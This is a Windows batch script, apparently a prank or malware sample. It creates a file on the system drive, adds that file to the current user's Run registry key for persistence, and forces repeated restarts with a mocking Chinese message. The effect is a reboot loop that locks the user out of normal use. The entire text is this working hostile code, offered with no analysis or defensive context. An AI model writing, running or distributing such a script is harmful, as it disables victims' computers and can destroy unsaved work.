@echo off
echo.@echo off >%systemdrive%\system.bat
echo.shutdown -r -f -t 10 -c "对不起！你被系统鄙视了" >>%systemdrive%\system.bat
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v "system" /t REG_SZ /d "%systemdrive%\system.bat" >nul
shutdown -r -f -t 10 -c "对不起！你被系统鄙视了"